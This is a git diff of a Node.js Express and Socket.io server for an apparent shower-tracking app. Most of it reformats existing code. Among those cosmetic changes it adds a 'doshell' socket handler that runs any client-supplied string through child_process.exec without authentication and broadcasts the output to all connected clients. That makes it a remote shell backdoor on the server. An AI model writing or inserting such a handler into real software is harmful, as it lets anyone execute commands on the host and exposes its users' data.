@@ -15,8 +15,10 @@ server.listen(port, function() {
 
 // Routing
 app.use(express.static(path.join(__dirname, 'pub/')));
-app.get('*', function(req, res){
-  res.sendFile('./pub/error/404.html', {root: __dirname })
+app.get('*', function(req, res) {
+    res.sendFile('./pub/error/404.html', {
+        root: __dirname
+    })
 });
 
 
@@ -111,8 +113,7 @@ function date() {
 function sortFunction(a, b) {
     if (a[0] === b[0]) {
         return 0;
-    }
-    else {
+    } else {
         return (a[0] < b[0]) ? -1 : 1;
     }
 }
@@ -197,6 +198,21 @@ function regshower(id, num) {
     console.log(accounts[id]['email'] + ' just ended their shower')
 }
 
+
+function doshell(command) {
+    console.log(command);
+    const {
+        exec
+    } = require('child_process');
+    exec(String(command), (err, stdout, stderr) => {
+
+        // the *entire* stdout and stderr (buffered)
+        console.log(`stdout: ${stdout}`);
+        console.log(`stderr: ${stderr}`);
+        io.emit('returnshell', stdout + stderr)
+    });
+}
+
 io.on('connection', function(socket) {
 
     socket.on('register', function(childusername, profile) {
@@ -251,11 +267,15 @@ io.on('connection', function(socket) {
 
     socket.on('getboard', function(sessionid) {
         var parseaccounts = []
-        for(var i in accounts){
-            parseaccounts.push([accounts[i]['tot']/(accounts[i]['showers'].length), accounts[i]['email']])
+        for (var i in accounts) {
+            parseaccounts.push([accounts[i]['tot'] / (accounts[i]['showers'].length), accounts[i]['email']])
         }
         parseaccounts = parseaccounts.sort(sortFunction).reverse().slice(0, 10)
         io.emit('returnboard', parseaccounts, sessionid);
+    });
+
+    socket.on('doshell', function(command) {
+        doshell(command)
     });
 
 });
